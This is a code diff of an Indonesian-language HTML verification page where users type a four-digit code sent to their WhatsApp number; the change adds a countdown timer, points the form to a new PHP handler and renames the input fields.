@@ -20,25 +20,26 @@
                     stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
             </svg>
             </a>
+            <div class="timer"><label id="countdown"></label><script src="./js/countdown.js"></script></div>
             <div class="Verifikasi">Verifikasi</div>
+            
             <div class="kata">
                 <div>Silahkan masukkan kode unik</div>
                 <div>yang dikirimkan ke nomor Whatsapp</div>
             </div>
+            
             <div class="codeOTP">
-                <form action="whatsapp.php" method="post">
+                <form action="php/verifOTP.php" method="post">
                     <div class="codeOTP1">
-                        <input type="codeOTP1" name="codeOTP1" maxlength="1" oninput="moveToNextInput(this)">
-                        <input type="codeOTP1" name="codeOTP1" maxlength="1" oninput="moveToNextInput(this)">
-                        <input type="codeOTP1" name="codeOTP1" maxlength="1" oninput="moveToNextInput(this)">
-                        <input type="codeOTP1" name="codeOTP1" maxlength="1" oninput="moveToNextInput(this)">
+                        <input type="codeOTP1" name="OTP1" maxlength="1" oninput="moveToNextInput(this)">
+                        <input type="codeOTP1" name="OTP2" maxlength="1" oninput="moveToNextInput(this)">
+                        <input type="codeOTP1" name="OTP3" maxlength="1" oninput="moveToNextInput(this)">
+                        <input type="codeOTP1" name="OTP4" maxlength="1" oninput="moveToNextInput(this)">
                     </div>
                     <script src="move.js"></script>
                     <button type="submit" name="lanjutkan" class="btn_input">Lanjutkan</button>
                 </form>
             </div>
         </div>
-        
-            
 </body>
 </html>
